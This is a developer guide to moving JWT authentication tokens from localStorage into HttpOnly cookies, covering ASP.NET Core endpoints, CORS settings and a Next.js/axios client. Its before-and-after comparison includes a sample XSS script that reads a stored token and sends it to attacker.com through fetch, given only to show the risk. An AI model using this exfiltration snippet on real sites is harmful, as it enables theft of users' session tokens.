# 🔐 SECURITY UPGRADE: HttpOnly Cookies Implementation Guide

## Why HttpOnly Cookies?

**Current Risk with localStorage**:
- ❌ Vulnerable to XSS (Cross-Site Scripting) attacks
- ❌ Any malicious script can steal your token
- ❌ Token visible in browser DevTools

**Benefits of HttpOnly Cookies**:
- ✅ **XSS Protection**: JavaScript cannot access the cookie
- ✅ **Automatic**: Browser sends cookie with every request
- ✅ **Secure Flag**: HTTPS-only transmission
- ✅ **SameSite**: CSRF attack protection
- ✅ **Production Standard**: Used by banks, financial apps

---

## Implementation Steps

### **STEP 1: Backend Changes (ASP.NET Core)**

#### **1.1 Update Login Endpoint**

```csharp
// Controllers/AccountController.cs

[HttpPost("Login")]
public async Task<IActionResult> Login([FromBody] LoginRequest request)
{
    // Validate credentials
    var user = await _userManager.FindByEmailAsync(request.Email);
    if (user == null || !await _userManager.CheckPasswordAsync(user, request.Password))
    {
        return Unauthorized(new { message = "بيانات الدخول غير صحيحة" });
    }

    // Generate JWT token
    var token = GenerateJwtToken(user);

    // ✅ NEW: Set httpOnly cookie instead of returning token in response
    Response.Cookies.Append("auth_token", token, new CookieOptions
    {
        HttpOnly = true,           // Cannot be accessed by JavaScript
        Secure = true,             // HTTPS only (set to false for local development)
        SameSite = SameSiteMode.Strict, // CSRF protection
        Expires = DateTimeOffset.UtcNow.AddDays(7),
        Path = "/",
        Domain = null // Set to your domain in production: ".yourdomain.com"
    });

    // Return user info WITHOUT token
    return Ok(new
    {
        userName = user.UserName,
        email = user.Email,
        userId = user.Id,
        phoneNumber = user.PhoneNumber,
        role = (await _userManager.GetRolesAsync(user)).FirstOrDefault() ?? "user"
    });
}
```

#### **1.2 Update Register Endpoint**

```csharp
[HttpPost("Register")]
public async Task<IActionResult> Register([FromBody] RegisterRequest request)
{
    // Create user
    var user = new ApplicationUser
    {
        UserName = request.FullName,
        Email = request.Email,
        PhoneNumber = request.PhoneNumber
    };

    var result = await _userManager.CreateAsync(user, request.Password);
    if (!result.Succeeded)
    {
        return BadRequest(new { message = result.Errors.FirstOrDefault()?.Description });
    }

    // Generate JWT token
    var token = GenerateJwtToken(user);

    // ✅ NEW: Set httpOnly cookie
    Response.Cookies.Append("auth_token", token, new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Strict,
        Expires = DateTimeOffset.UtcNow.AddDays(7),
        Path = "/"
    });

    return Ok(new
    {
        userName = user.UserName,
        email = user.Email,
        userId = user.Id,
        phoneNumber = user.PhoneNumber,
        role = "user"
    });
}
```

#### **1.3 Add Logout Endpoint**

```csharp
[HttpPost("Logout")]
public IActionResult Logout()
{
    // ✅ NEW: Delete the cookie
    Response.Cookies.Delete("auth_token", new CookieOptions
    {
        HttpOnly = true,
        Secure = true,
        SameSite = SameSiteMode.Strict,
        Path = "/"
    });

    return Ok(new { message = "تم تسجيل الخروج بنجاح" });
}
```

#### **1.4 Update JWT Authentication Middleware**

```csharp
// Program.cs or Startup.cs

services.AddAuthentication(options =>
{
    options.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
    options.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
})
.AddJwtBearer(options =>
{
    options.TokenValidationParameters = new TokenValidationParameters
    {
        ValidateIssuer = true,
        ValidateAudience = true,
        ValidateLifetime = true,
        ValidateIssuerSigningKey = true,
        ValidIssuer = Configuration["Jwt:Issuer"],
        ValidAudience = Configuration["Jwt:Audience"],
        IssuerSigningKey = new SymmetricSecurityKey(
            Encoding.UTF8.GetBytes(Configuration["Jwt:Key"])
        )
    };

    // ✅ NEW: Read token from cookie instead of Authorization header
    options.Events = new JwtBearerEvents
    {
        OnMessageReceived = context =>
        {
            // Try to get token from cookie first
            if (context.Request.Cookies.TryGetValue("auth_token", out var token))
            {
                context.Token = token;
            }
            // Fallback to Authorization header for backward compatibility
            else if (context.Request.Headers.ContainsKey("Authorization"))
            {
                var authHeader = context.Request.Headers["Authorization"].ToString();
                if (authHeader.StartsWith("Bearer ", StringComparison.OrdinalIgnoreCase))
                {
                    context.Token = authHeader.Substring("Bearer ".Length).Trim();
                }
            }
            return Task.CompletedTask;
        }
    };
});
```

#### **1.5 Configure CORS for Cookies**

```csharp
// Program.cs

services.AddCors(options =>
{
    options.AddPolicy("AllowFrontend", builder =>
    {
        builder
            .WithOrigins(
                "http://localhost:3000",           // Local development
                "https://yourdomain.com",          // Production
                "https://www.yourdomain.com"       // Production with www
            )
            .AllowCredentials()  // ✅ CRITICAL: Required for cookies
            .AllowAnyHeader()
            .AllowAnyMethod();
    });
});

app.UseCors("AllowFrontend");
```

---

### **STEP 2: Frontend Changes**

#### **2.1 Update Auth Store (Remove Token from State)**

```typescript
// store/auth.store.ts

interface UserProfile {
    userId: string;
    userName: string;
    email: string;
    phoneNumber?: string;
    role?: string;
}

interface AuthState {
    // ❌ REMOVE: token: string | null;
    isAuthenticated: boolean;
    user: UserProfile | null;
    _hasHydrated: boolean;
    
    setAuth: (user: UserProfile) => void;
    logout: () => void;
    setHasHydrated: (state: boolean) => void;
}

export const useAuthStore = create<AuthState>()(
    persist(
        (set, get) => ({
            // ❌ REMOVE: token: null,
            isAuthenticated: false,
            user: null,
            _hasHydrated: false,

            setAuth: (user) => {
                set({
                    isAuthenticated: true,
                    user,
                });
            },

            logout: () => {
                set({
                    isAuthenticated: false,
                    user: null,
                });
            },

            setHasHydrated: (state) => {
                set({ _hasHydrated: state });
            },
        }),
        {
            name: 'top-home-auth',
            storage: createJSONStorage(() => localStorage),
        }
    )
);
```

#### **2.2 Update API Client**

```typescript
// lib/api-client.ts

import axios from 'axios';
import { useAuthStore } from '@/store/auth.store';
import { API_BASE_URL as BASE_URL } from '@/lib/constants';

const API_BASE_URL = BASE_URL ? `${BASE_URL}/api/` : '/api/';

const apiClient = axios.create({
    baseURL: API_BASE_URL,
    headers: {
        'Content-Type': 'application/json',
    },
    withCredentials: true, // ✅ CRITICAL: Send cookies with requests
    timeout: 30000,
});

// ❌ REMOVE: Request interceptor for token injection
// Cookies are sent automatically

// ✅ KEEP: Response interceptor for error handling
apiClient.interceptors.response.use(
    (response) => response,
    async (error) => {
        if (error.response?.status === 401) {
            const { logout } = useAuthStore.getState();
            logout();
            
            if (typeof window !== 'undefined') {
                window.location.href = '/login';
            }
        }
        
        return Promise.reject(error);
    }
);

export default apiClient;
```

#### **2.3 Update Auth Service**

```typescript
// services/auth.service.ts

import apiClient from '@/lib/api-client';

interface LoginResponse {
    userName: string;
    email: string;
    userId: string;
    phoneNumber?: string;
    role?: string;
    // ❌ REMOVE: token: string;
}

export const authService = {
    login: async (data: LoginFormData): Promise<LoginResponse> => {
        const response = await apiClient.post<LoginResponse>('Account/Login', {
            email: data.email,
            password: data.password,
        });
        // Cookie is set automatically by backend
        return response.data;
    },

    register: async (data: RegisterFormData): Promise<LoginResponse> => {
        const response = await apiClient.post<LoginResponse>('Account/Register', {
            fullName: data.fullName,
            email: data.email,
            password: data.password,
            confirmPassword: data.confirmPassword,
            phoneNumber: data.phoneNumber,
        });
        // Cookie is set automatically by backend
        return response.data;
    },

    logout: async (): Promise<void> => {
        // ✅ NEW: Call backend to delete cookie
        await apiClient.post('Account/Logout');
    },
};
```

#### **2.4 Update useAuth Hook**

```typescript
// hooks/useAuth.ts

export const useAuth = () => {
    const router = useRouter();
    const { setAuth, logout, isAuthenticated, user } = useAuthStore();
    const [isLoading, setIsLoading] = useState(false);
    const [error, setError] = useState<string | null>(null);

    const login = async (data: LoginFormData) => {
        setIsLoading(true);
        setError(null);
        try {
            const response = await authService.login(data);
            
            // ✅ NEW: Only store user data, not token
            setAuth({
                userId: response.userId,
                userName: response.userName,
                email: response.email,
                phoneNumber: response.phoneNumber,
                role: response.role,
            });
            
            router.push('/');
            router.refresh();
        } catch (err: any) {
            setError(err.message || 'فشل تسجيل الدخول');
            throw err;
        } finally {
            setIsLoading(false);
        }
    };

    const handleLogout = async () => {
        try {
            // ✅ NEW: Call backend logout endpoint
            await authService.logout();
        } catch (error) {
            console.error('Logout error:', error);
        } finally {
            logout();
            router.push('/login');
            router.refresh();
        }
    };

    return {
        login,
        register,
        logout: handleLogout,
        isAuthenticated,
        user,
        isLoading,
        error,
    };
};
```

---

### **STEP 3: Environment Configuration**

#### **3.1 Development (HTTP)**

```env
# .env.local
NEXT_PUBLIC_API_BASE_URL=http://localhost:5000
```

```csharp
// Backend: appsettings.Development.json
{
  "Jwt": {
    "Key": "your-secret-key-min-32-characters",
    "Issuer": "http://localhost:5000",
    "Audience": "http://localhost:3000"
  }
}
```

**Cookie Options for Development**:
```csharp
Response.Cookies.Append("auth_token", token, new CookieOptions
{
    HttpOnly = true,
    Secure = false,  // ✅ Set to false for HTTP in development
    SameSite = SameSiteMode.Lax, // ✅ Lax for development
    Expires = DateTimeOffset.UtcNow.AddDays(7),
    Path = "/"
});
```

#### **3.2 Production (HTTPS)**

```env
# .env.production
NEXT_PUBLIC_API_BASE_URL=https://api.yourdomain.com
```

```csharp
// Backend: appsettings.Production.json
{
  "Jwt": {
    "Key": "your-production-secret-key-min-32-characters",
    "Issuer": "https://api.yourdomain.com",
    "Audience": "https://yourdomain.com"
  }
}
```

**Cookie Options for Production**:
```csharp
Response.Cookies.Append("auth_token", token, new CookieOptions
{
    HttpOnly = true,
    Secure = true,  // ✅ HTTPS only
    SameSite = SameSiteMode.Strict, // ✅ Strict for production
    Expires = DateTimeOffset.UtcNow.AddDays(7),
    Path = "/",
    Domain = ".yourdomain.com" // ✅ Set domain for subdomain support
});
```

---

## Testing Checklist

### **Development Testing**:
- [ ] Login → Cookie set in browser (check DevTools → Application → Cookies)
- [ ] API calls → Cookie sent automatically (check Network tab)
- [ ] Logout → Cookie deleted
- [ ] Refresh page → User stays logged in
- [ ] Token expires → Auto logout

### **Security Testing**:
- [ ] Try to access cookie via JavaScript → Should fail
- [ ] Check cookie flags: HttpOnly=true, Secure=true (production)
- [ ] Test CORS with credentials
- [ ] Verify SameSite protection

### **Production Deployment**:
- [ ] HTTPS enabled on both frontend and backend
- [ ] CORS configured with AllowCredentials
- [ ] Cookie domain set correctly
- [ ] Secure flag enabled

---

## Troubleshooting

### **Issue: Cookie not being set**

**Solution**:
1. Check CORS configuration includes `AllowCredentials()`
2. Verify `withCredentials: true` in axios config
3. Check cookie domain matches your domain
4. Ensure HTTPS in production

### **Issue: Cookie not sent with requests**

**Solution**:
1. Verify `withCredentials: true` in axios
2. Check SameSite policy (use Lax for development)
3. Ensure cookie domain is correct
4. Check cookie hasn't expired

### **Issue: CORS errors**

**Solution**:
```csharp
// Backend CORS must include:
.WithOrigins("http://localhost:3000")
.AllowCredentials()  // CRITICAL
.AllowAnyHeader()
.AllowAnyMethod()
```

---

## Migration Checklist

### **Phase 1: Preparation**
- [ ] Update backend login/register endpoints
- [ ] Add logout endpoint
- [ ] Configure CORS with AllowCredentials
- [ ] Update JWT middleware to read from cookies

### **Phase 2: Frontend Updates**
- [ ] Update auth store (remove token)
- [ ] Update API client (add withCredentials)
- [ ] Update auth service
- [ ] Update useAuth hook

### **Phase 3: Testing**
- [ ] Test in development (HTTP)
- [ ] Test all auth flows
- [ ] Test wishlist isolation
- [ ] Test token expiry

### **Phase 4: Production**
- [ ] Enable HTTPS
- [ ] Set Secure flag to true
- [ ] Set SameSite to Strict
- [ ] Deploy and monitor

---

## Comparison: Before vs After

### **Before (localStorage)**:
```typescript
// Token visible in DevTools
localStorage.getItem('top-home-auth')
// → { "state": { "token": "eyJhbGc..." } }

// Vulnerable to XSS
<script>
  const token = JSON.parse(localStorage.getItem('top-home-auth')).state.token;
  // Send to attacker's server
  fetch('https://attacker.com/steal?token=' + token);
</script>
```

### **After (httpOnly Cookies)**:
```typescript
// Token NOT accessible to JavaScript
document.cookie
// → "auth_token=eyJhbGc... (httpOnly)"

// XSS attack fails
<script>
  const token = document.cookie; // Cannot access httpOnly cookie
  // → undefined or other non-httpOnly cookies only
</script>
```

---

## Conclusion

**Security Improvement**:
- 🟡 MEDIUM (localStorage) → 🟢 HIGH (httpOnly cookies)

**Implementation Time**:
- Backend: ~2 hours
- Frontend: ~1 hour
- Testing: ~1 hour
- **Total**: ~4 hours

**Recommendation**: 
✅ **Implement httpOnly cookies for production**

This is the industry standard for secure authentication and will protect your users from XSS attacks.
